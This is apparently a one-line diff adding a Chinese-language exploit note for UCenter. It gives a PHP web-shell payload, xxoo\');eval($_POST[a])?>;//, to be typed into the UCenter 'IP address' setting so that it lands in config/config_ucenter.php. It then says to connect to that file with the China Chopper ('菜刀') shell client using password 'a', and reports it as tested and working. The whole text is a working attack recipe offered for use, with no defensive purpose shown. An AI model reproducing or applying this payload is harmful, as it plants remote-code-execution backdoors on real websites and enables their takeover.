@@ -1,0 +1,1 @@
+直接在UCenter IP 地址:里面插入一句话 xxoo\\');eval($_POST[a])?>;// 就ok 然后菜刀连接http://www.xxoo.com/config/config_ucenter.php 密码a ， 测试通过
